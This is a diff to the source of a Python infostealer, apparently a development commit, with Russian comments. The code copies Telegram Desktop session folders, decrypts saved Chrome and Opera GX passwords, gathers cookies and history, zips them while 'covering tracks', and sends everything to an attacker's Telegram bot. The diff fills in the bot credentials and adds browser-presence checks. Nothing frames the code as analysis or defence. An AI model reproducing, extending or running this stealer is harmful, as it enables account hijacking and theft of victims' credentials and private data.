@@ -8,16 +8,16 @@ from requests import Session
 import win32crypt
 from Crypto.Cipher import AES
 
-TOKEN = ""  # Токен бота
-CHAT_ID =   # Ваш чат ID
+TOKEN = "1111111111111111111111111111111111111111"  # Токен бота
+CHAT_ID = 111111111  # Ваш чат ID
 
 url_Document = f'https://api.telegram.org/bot{TOKEN}/sendDocument?chat_id={CHAT_ID}'
 url_text = lambda text: f'https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={text}'
 
 paths_Telegram = (
 	os.environ['USERPROFILE'] + "\\AppData\\Roaming\\Telegram Desktop\\tdata",
-	'D:\\Telegram Desktop\\tdata', 'C:\\Program Files\\Telegram Desktop\\tdata',
-	'D:\\Programs\\Telegram Desktop\\tdata')  # папки где могут храниться данные телеграмма
+	'D:\\Telegram Desktop\\tdata', 'C:\\Program Files\\Telegram Desktop\\tdata'
+	)  # папки где могут храниться данные телеграмма
 
 current_user = os.getlogin()  # имя пользователя
 user_path = os.path.expanduser('~')  # путь по имя пользователя (C:\\Users\\Admin)
@@ -146,6 +146,7 @@ class Data:
 		with open(user_path + path_to_save, "w", encoding="utf-8") as cookies:
 			results = results.replace('True', 'true')
 			results = results.replace('False', 'false')
+			results = results.replace('""', '"')
 			results = results[:-1] + '\n]'
 			cookies.write(results)
 
@@ -153,7 +154,6 @@ class Data:
 ###############################################################################
 #                               Telegram                                      #
 ###############################################################################
-
 class Telegram:
 	@staticmethod
 	def telegram():
@@ -163,11 +163,11 @@ class Telegram:
 							# 1) откуда 2) куда 3) что не копировать.     Сама создает директорию, если она уже существует то вызывает ошибку
 				break
 			except: pass
-		
+
 		if not os.path.exists(tg_path): # если нет папки -> завершение процесса
 			Support.send_error("Telegram")
 			return False
-		
+
 		try:
 			# удаляем ненужные файлы размером больше 500кб
 			listdir = os.listdir(tg_path)
@@ -225,6 +225,10 @@ class Telegram:
 class Chrome:
 	""" Данные Chrome"""
 	path = r'\AppData\Local\Google\Chrome\User Data\Local State'  # путь до файла с зашифрованным мастер паролем
+	def check_browzer():
+		if not os.path.exists(Chrome.path):
+			raise Exception
+
 	# ----------------------------------------------- Логины и Пароли начало скрипта
 	@staticmethod
 	def get_login_and_password():
@@ -301,6 +305,7 @@ class Chrome:
 	@staticmethod
 	def main():
 		try:
+			Chrome.check_browzer()
 			Chrome.get_login_and_password()
 			Chrome.main_history_cookies()
 			Chrome.create_zip_cover_tracks()
@@ -316,6 +321,9 @@ class Chrome:
 class OperaGX:
 	""" Данные OperaGX GX"""
 	path = r'\AppData\Roaming\Opera Software\Opera GX Stable\Local State'
+	def check_browzer():
+		if not os.path.exists(OperaGX.path):
+			raise Exception
 	# ----------------------------------------------- Логины и Пароли начало скрипта
 	@staticmethod
 	def get_login_and_password():
@@ -392,6 +400,7 @@ class OperaGX:
 	@staticmethod
 	def main():
 		try:
+			OperaGX.check_browzer()
 			OperaGX.get_login_and_password()
 			OperaGX.main_history_cookies()
 			OperaGX.create_zip_cover_tracks()
